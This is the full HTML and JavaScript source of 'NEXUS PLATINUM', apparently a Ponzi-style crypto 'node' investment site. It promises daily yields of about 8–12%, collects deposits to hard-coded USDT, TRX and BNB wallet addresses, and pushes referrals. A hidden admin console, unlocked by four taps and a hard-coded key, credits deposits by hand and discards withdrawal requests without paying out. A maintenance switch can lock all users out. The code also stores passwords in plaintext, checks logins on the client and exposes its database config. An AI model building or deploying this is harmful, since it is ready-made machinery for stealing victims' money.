<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS PLATINUM | Sovereign Infrastructure</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&display=swap');
        :root { --main: #6366f1; --accent: #0ea5e9; --bg: #f8fafc; }
        body { background: var(--bg); color: #1e293b; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        
        .glass-card { background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(20px); border: 1px solid white; border-radius: 28px; box-shadow: 0 15px 35px -5px rgba(0, 0, 0, 0.05); transition: 0.3s; }
        .btn-master { background: linear-gradient(135deg, #6366f1, #0ea5e9); color: white; border-radius: 18px; font-weight: 800; transition: 0.3s; box-shadow: 0 10px 25px rgba(99, 102, 241, 0.3); border: none; cursor: pointer; }
        .btn-master:active { transform: scale(0.96); }
        .input-field { background: #f1f5f9; border: 1.5px solid #e2e8f0; border-radius: 16px; padding: 16px; outline: none; width: 100%; transition: 0.3s; }
        .input-field:focus { border-color: var(--main); background: white; }
        
        .nav-active { color: var(--main) !important; transform: translateY(-3px); }
        .vip-badge { background: linear-gradient(90deg, #f59e0b, #ef4444); color: white; font-size: 9px; padding: 3px 10px; border-radius: 20px; font-weight: 900; position: absolute; top: 15px; left: 15px; z-index: 10; }
        .timer-box { font-family: monospace; font-weight: bold; background: #eef2ff; padding: 4px 8px; border-radius: 8px; color: #4338ca; }
        
        #maintenance-screen { position: fixed; inset: 0; background: white; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .hidden { display: none !important; }
        .page-transition { animation: fadeIn 0.4s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="maintenance-screen" class="hidden">
        <div class="w-20 h-20 border-4 border-indigo-600 border-t-transparent rounded-full animate-spin"></div>
        <h2 class="mt-8 text-2xl font-black text-slate-800 italic uppercase tracking-tighter">Core Upgrading</h2>
        <p class="text-slate-400 text-[10px] font-bold uppercase tracking-widest mt-2">NEXUS Nodes are syncing with Global V4.0 Protocol.</p>
    </div>

    <div id="auth-ui" class="min-h-screen flex items-center justify-center p-6 bg-slate-50">
        <div class="max-w-md w-full space-y-8 page-transition">
            <div class="text-center mb-10">
                <div class="w-16 h-16 btn-master mx-auto flex items-center justify-center text-3xl font-black italic rounded-2xl mb-4">N</div>
                <h1 class="text-3xl font-black text-slate-900 tracking-tighter">NEXUS<span class="text-indigo-600 italic">.PLATINUM</span></h1>
                <p class="text-[9px] font-bold uppercase tracking-[5px] text-slate-400 mt-2 italic">Institutional Asset Terminal</p>
            </div>

            <div id="login-box" class="glass-card p-8 space-y-5">
                <h2 class="text-xl font-black text-slate-800 uppercase italic">Access ID</h2>
                <input type="text" id="l-user" placeholder="Protocol Username" class="input-field">
                <input type="password" id="l-pass" placeholder="Security Key" class="input-field">
                <button onclick="handleLogin()" class="btn-master w-full py-4 uppercase">Authorize Hub</button>
                <p class="text-center text-[10px] font-bold text-slate-500 uppercase">Need Terminal Access? <span onclick="toggleAuth(true)" class="text-indigo-600 cursor-pointer">Register Identity</span></p>
            </div>

            <div id="signup-box" class="glass-card p-8 space-y-5 hidden border-t-4 border-indigo-500">
                <h2 class="text-xl font-black text-indigo-600 uppercase italic">Create Profile</h2>
                <input type="text" id="s-user" placeholder="Assign Username" class="input-field">
                <input type="password" id="s-pass" placeholder="Set Security Key" class="input-field">
                <input type="text" id="s-ref" placeholder="Referral ID (Optional)" class="input-field">
                <button onclick="handleSignup()" class="btn-master w-full py-4 uppercase">Initialize Sync</button>
                <p class="text-center text-[10px] font-bold text-slate-500 uppercase">Existing Member? <span onclick="toggleAuth(false)" class="text-indigo-600 cursor-pointer">Return to Login</span></p>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden pb-28">
        <header class="p-5 flex justify-between items-center sticky top-0 bg-white/80 backdrop-blur-xl z-50 border-b border-slate-100">
            <div class="flex items-center gap-3">
                <div id="admin-trigger" class="w-10 h-10 btn-master rounded-xl flex items-center justify-center text-xl font-black italic">N</div>
                <div>
                    <p id="nav-user" class="text-xs font-black text-slate-900 italic uppercase">User</p>
                    <p class="text-[8px] font-bold text-emerald-500 uppercase tracking-widest animate-pulse">● Protocol Secure</p>
                </div>
            </div>
            <button onclick="logout()" class="w-10 h-10 rounded-full bg-red-50 text-red-400 border border-red-100"><i class="fa-solid fa-power-off"></i></button>
        </header>

        <main id="page-home" class="p-5 space-y-6 page-transition">
            <div class="glass-card p-8 bg-gradient-to-br from-indigo-500/5 to-white border-none">
                <p class="text-[9px] font-black text-indigo-400 uppercase tracking-[4px] mb-1">Available Equity</p>
                <h2 id="balance-txt" class="text-4xl font-black text-slate-900 tracking-tighter">$0.00</h2>
                <div class="flex justify-between mt-8 pt-6 border-t border-slate-100">
                    <div><p class="text-[8px] font-bold text-slate-400 uppercase">Real-time Yield</p><p id="profit-txt" class="text-lg font-black text-emerald-500">+$0.00</p></div>
                    <button onclick="copyRef()" class="bg-indigo-600 text-white px-5 py-2 rounded-xl text-[9px] font-black uppercase italic shadow-lg shadow-indigo-200">Share ID</button>
                </div>
            </div>
            <h3 class="font-black text-[10px] uppercase text-slate-400 tracking-widest ml-1">Live Node Activity</h3>
            <div id="active-nodes-list" class="space-y-3"></div>
        </main>

        <main id="page-market" class="p-5 space-y-10 hidden page-transition">
            <div>
                <h3 class="text-lg font-black italic text-slate-800 uppercase flex items-center gap-2"><i class="fa-solid fa-crown text-amber-500"></i> VIP Sovereign Nodes</h3>
                <div id="elite-nodes" class="grid gap-5 mt-4"></div>
            </div>
            <div>
                <h3 class="text-lg font-black italic text-slate-800 uppercase flex items-center gap-2 mt-8"><i class="fa-solid fa-server text-indigo-500"></i> Institutional Nodes</h3>
                <div id="normal-nodes" class="grid gap-5 mt-4"></div>
            </div>
        </main>

        <main id="page-vault" class="p-5 space-y-6 hidden page-transition">
            <div class="glass-card p-6 space-y-5">
                <h3 class="font-black uppercase text-slate-800 italic flex items-center gap-2"><i class="fa-solid fa-building-columns text-emerald-500"></i> Deposit Assets</h3>
                <select id="dep-method" class="input-field font-bold text-sm" onchange="updateDepAddr()">
                    <option value="">Select Asset Protocol</option>
                    <option value="USDT_TRC20">USDT (TRC20 Network)</option>
                    <option value="TRX">TRX (TRON Native)</option>
                    <option value="BNB">BNB (Smart Chain)</option>
                </select>
                <div id="dep-details" class="hidden space-y-5 animate-in fade-in slide-in-from-top-2">
                    <div class="p-4 bg-slate-100 rounded-2xl text-center border border-slate-200">
                        <p id="dep-addr-display" class="text-[11px] font-mono font-bold text-indigo-600 select-all break-all"></p>
                    </div>
                    <input type="number" id="dep-amt" placeholder="Deposit Amount ($)" class="input-field">
                    <input type="text" id="dep-tid" placeholder="Transaction ID (TID)" class="input-field">
                    <div class="p-4 border-2 border-dashed border-slate-200 rounded-2xl text-center">
                        <input type="file" id="dep-proof" accept="image/*" class="text-[10px] font-bold">
                        <p class="text-[8px] text-slate-400 mt-2 uppercase font-black">Upload Proof Screenshot (Base64 Mode)</p>
                    </div>
                    <button onclick="processDeposit()" class="btn-master w-full py-4 uppercase italic">Initialize Settlement</button>
                </div>
            </div>

            <div class="glass-card p-6 space-y-4">
                <h3 class="font-black uppercase text-slate-800 italic flex items-center gap-2"><i class="fa-solid fa-paper-plane text-red-500"></i> Withdrawal Hub</h3>
                <select id="with-method" class="input-field font-bold text-sm">
                    <option value="Binance Pay">Binance Pay</option>
                    <option value="USDT">USDT (TRC20)</option>
                    <option value="CashApp">CashApp</option>
                    <option value="Bank">Bank Wire</option>
                </select>
                <input type="text" id="w-user" placeholder="Account Identifier" class="input-field">
                <input type="text" id="w-addr" placeholder="Wallet / Payout Address" class="input-field">
                <input type="number" id="w-amt" placeholder="Withdrawal Amount ($)" class="input-field">
                <button onclick="processWithdraw()" class="btn-master w-full py-4 !from-slate-800 !to-slate-900 uppercase italic">Request Egress</button>
            </div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 p-6 bg-white/90 backdrop-blur-2xl border-t border-slate-100 flex justify-around z-[1000] items-center">
            <div onclick="switchPage('home')" class="nav-item nav-active flex flex-col items-center"><i class="fa-solid fa-house-chimney text-2xl"></i><span class="text-[8px] font-black mt-1 uppercase">Home</span></div>
            <div onclick="switchPage('market')" class="nav-item flex flex-col items-center"><i class="fa-solid fa-microchip text-2xl"></i><span class="text-[8px] font-black mt-1 uppercase">Market</span></div>
            <div onclick="switchPage('vault')" class="nav-item flex flex-col items-center"><i class="fa-solid fa-wallet text-2xl"></i><span class="text-[8px] font-black mt-1 uppercase">Vault</span></div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-slate-50 z-[10000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b pb-4">
            <h2 class="text-xl font-black text-indigo-900 italic uppercase tracking-tighter">Imperial Control Console</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-4xl text-slate-300">&times;</button>
        </div>
        <div class="glass-card p-4 flex items-center justify-between mb-8">
            <p class="text-[10px] font-black uppercase text-slate-500">Global Maintenance</p>
            <button id="m-btn" onclick="toggleM()" class="bg-slate-200 px-6 py-2 rounded-full font-black text-[9px] uppercase">OFF</button>
        </div>
        
        <h3 class="text-xs font-black uppercase text-indigo-600 mb-4 ml-2">Pending Protocols</h3>
        <div id="admin-requests" class="grid gap-4"></div>
        
        <h3 class="text-xs font-black uppercase text-slate-400 mt-10 mb-4 ml-2">Network Identities</h3>
        <div id="admin-users" class="grid gap-2"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // NODE MARKET CONFIG
        const eliteNodes = [
            { id: 101, title: "Sovereign Prime", price: 1500, daily: 125, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&w=400" },
            { id: 102, title: "Global Nexus", price: 3000, daily: 280, img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?auto=format&fit=crop&w=400" },
            { id: 103, title: "Imperial Core", price: 5000, daily: 550, img: "https://images.unsplash.com/photo-1644088379091-d574269d422f?auto=format&fit=crop&w=400" },
            { id: 104, title: "Alpha Omega", price: 10000, daily: 1200, img: "https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?auto=format&fit=crop&w=400" }
        ];
        const normalNodes = Array.from({length: 12}, (_, i) => ({
            id: i+1, title: `Retail Node N-${i+1}`, price: 50 + (i*100), daily: 4 + (i*9), img: `https://images.unsplash.com/photo-1614850523296-d8c1af93d400?auto=format&fit=crop&w=400&sig=${i}`
        }));

        window.onload = () => {
            renderMarket();
            checkM();
            const u = localStorage.getItem('nexus_user');
            if(u) showDashboard(u);
        };

        function renderMarket() {
            document.getElementById('elite-nodes').innerHTML = eliteNodes.map(n => nodeCard(n, true)).join('');
            document.getElementById('normal-nodes').innerHTML = normalNodes.map(n => nodeCard(n, false)).join('');
        }

        const nodeCard = (n, isVip) => `
            <div class="glass-card overflow-hidden relative">
                <div class="h-32 overflow-hidden">
                    <img src="${n.img}" class="w-full h-full object-cover">
                    ${isVip ? `<span class="vip-badge italic">VIP ELITE</span>` : ''}
                </div>
                <div class="p-5">
                    <h4 class="font-black text-slate-800 uppercase text-xs italic tracking-tighter">${n.title}</h4>
                    <div class="flex justify-between items-end mt-5">
                        <div><p class="text-[8px] font-black text-slate-400 uppercase">24H Yield</p><p class="text-sm font-black text-emerald-500">+$${n.daily}</p></div>
                        <div class="text-right"><p class="text-xl font-black text-slate-900">$${n.price}</p><button onclick="buyNode(${n.id})" class="btn-master px-5 py-2 text-[9px] uppercase italic">Activate</button></div>
                    </div>
                </div>
            </div>`;

        // AUTH CORE
        window.handleLogin = async () => {
            const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value.trim();
            if(!u || !p) return;
            const s = await get(ref(db, `users/${u}`));
            if(s.exists() && s.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); } else alert("Login Declined.");
        };

        window.handleSignup = async () => {
            const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value.trim(), r = document.getElementById('s-ref').value.trim();
            if(!u || !p) return;
            const s = await get(ref(db, `users/${u}`));
            if(s.exists()) return alert("Identity exists.");
            await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, referredBy: r });
            alert("Terminal Registered, sweetie! 💋"); toggleAuth(false);
        };

        // DEPOSIT BASE64 PROOF
        window.processDeposit = () => {
            const file = document.getElementById('dep-proof').files[0];
            const amt = document.getElementById('dep-amt').value, tid = document.getElementById('dep-tid').value;
            if(!file || !amt || !tid) return alert("Missing data points.");
            
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = async () => {
                const u = localStorage.getItem('nexus_user'), hKey = push(ref(db, 'admin/requests')).key;
                const data = { id: hKey, user: u, amount: amt, tid, proof: reader.result, method: document.getElementById('dep-method').value, type: 'Deposit', date: new Date().toLocaleString() };
                await set(ref(db, `admin/requests/${hKey}`), data);
                alert("Deposit Protocol Uploaded! 💋");
                switchPage('home');
            };
        };

        window.processWithdraw = async () => {
            const u = localStorage.getItem('nexus_user'), amt = parseFloat(document.getElementById('w-amt').value);
            const userSnap = await get(ref(db, `users/${u}`));
            if(amt < 10 || userSnap.val().profit < amt) return alert("Insufficient Yield.");
            const hKey = push(ref(db, 'admin/requests')).key;
            await set(ref(db, `admin/requests/${hKey}`), { id: hKey, user: u, amount: amt, account: document.getElementById('w-user').value, method: document.getElementById('with-method').value, address: document.getElementById('w-addr').value, type: 'Withdrawal', date: new Date().toLocaleString() });
            await update(ref(db, `users/${u}`), { profit: userSnap.val().profit - amt });
            alert("Payout Requested! 💋");
        };

        // DASHBOARD REFRESH
        function showDashboard(uid) {
            document.getElementById('auth-ui').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('balance-txt').innerText = '$' + (d.balance || 0).toFixed(2);
                document.getElementById('profit-txt').innerText = '+$' + (d.profit || 0).toFixed(2);
                const nodes = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-nodes-list').innerHTML = nodes.map(([k, n]) => `
                    <div class="glass-card p-5 flex justify-between items-center border-l-4 border-indigo-500 animate-in fade-in">
                        <div><p class="text-[10px] font-black uppercase text-slate-800">${n.title}</p><p class="text-[8px] font-bold text-emerald-500 tracking-widest mt-1">YIELD: $${n.daily}/DAY</p></div>
                        <div class="text-right">
                            <p class="text-[8px] font-black text-indigo-400 uppercase mb-1">Next Settlement</p>
                            <span class="timer-box text-[10px] countdown" data-next="${n.nextClaim}">--:--:--</span>
                        </div>
                    </div>`).join('') || '<p class="text-center py-20 opacity-20 font-black text-[10px] uppercase tracking-[5px]">No Node Activity</p>';
            });
        }

        window.buyNode = async (nodeId) => {
            const u = localStorage.getItem('nexus_user'), node = [...eliteNodes, ...normalNodes].find(n => n.id === nodeId);
            const s = await get(ref(db, `users/${u}`));
            if(s.val().balance >= node.price) {
                const k = push(ref(db, `users/${u}/nodes`)).key;
                await update(ref(db, `users/${u}`), { balance: s.val().balance - node.price });
                await set(ref(db, `users/${u}/nodes/${k}`), { ...node, nextClaim: Date.now() + 86400000 });
                alert("Node Synced! 🚀");
            } else alert("Insufficient Equity.");
        };

        // ADMIN MODULE
        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Imperial Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; } };
        
        function loadAdmin() {
            onValue(ref(db, 'admin/requests'), (s) => {
                const d = s.val();
                document.getElementById('admin-requests').innerHTML = d ? Object.values(d).map(r => `
                    <div class="glass-card p-5 space-y-4 border border-indigo-100">
                        <div class="flex justify-between items-start"><p class="text-[10px] font-black uppercase text-indigo-600">${r.type}</p><p class="text-lg font-black">$${r.amount}</p></div>
                        <p class="text-[9px] font-bold text-slate-500 uppercase">USER: ${r.user} | TID: ${r.tid}</p>
                        ${r.proof ? `<img src="${r.proof}" class="w-full h-44 object-cover rounded-2xl border">` : `<p class="text-[9px] text-red-500">To: ${r.address}</p>`}
                        <div class="flex gap-2">
                            <button onclick="approve('${r.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-emerald-500 text-white py-3 rounded-xl text-[9px] font-black uppercase">Verify</button>
                            <button onclick="reject('${r.id}')" class="flex-1 bg-red-500 text-white py-3 rounded-xl text-[9px] font-black uppercase">Deny</button>
                        </div>
                    </div>`).join('') : '';
            });
            onValue(ref(db, 'users'), (s) => {
                document.getElementById('admin-users').innerHTML = s.val() ? Object.values(s.val()).map(u => `
                    <div class="glass-card p-4 flex justify-between items-center"><p class="text-[10px] font-black uppercase italic">${u.username}</p><p class="text-[10px] font-black text-indigo-500">$${(u.balance||0).toFixed(2)}</p></div>`).join('') : '';
            });
        }

        window.approve = async (id, user, amt, type) => {
            const s = await get(ref(db, `users/${user}`));
            if(type === 'Deposit') await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
            await remove(ref(db, 'admin/requests/' + id));
        };
        window.reject = async (id) => remove(ref(db, 'admin/requests/' + id));

        // UTILS
        window.switchPage = (p) => { ['home','market','vault'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); document.getElementById('page-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('nav-active')); event.currentTarget.classList.add('nav-active'); };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.updateDepAddr = () => { const m = document.getElementById('dep-method').value; const addrs = { USDT_TRC20: 'TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ', TRX: 'TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76', BNB: '0xD9359EADE5F5bACA51fb7da043767Bc0685bC355' }; document.getElementById('dep-addr-display').innerText = addrs[m] || ''; document.getElementById('dep-details').classList.toggle('hidden', !m); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.checkM = () => onValue(ref(db, 'system/maintenance'), (s) => { document.getElementById('maintenance-screen').classList.toggle('hidden', !s.val()); document.getElementById('m-btn').innerText = s.val() ? "ON" : "OFF"; document.getElementById('m-btn').classList.toggle('bg-indigo-600', s.val()); document.getElementById('m-btn').classList.toggle('text-white', s.val()); });
        window.toggleM = async () => { const s = await get(ref(db, 'system/maintenance')); await set(ref(db, 'system/maintenance'), !s.val()); };
        window.copyRef = () => { navigator.clipboard.writeText(window.location.href + "?ref=" + localStorage.getItem('nexus_user')); alert("Referral Protocol Link Copied!"); };

        // TIMER LOOP
        setInterval(() => {
            document.querySelectorAll('.countdown').forEach(el => {
                const diff = parseInt(el.dataset.next) - Date.now();
                if(diff > 0) {
                    const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                    el.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
                } else el.innerText = "Syncing Yield...";
            });
        }, 1000);
    </script>
</body>
</html>
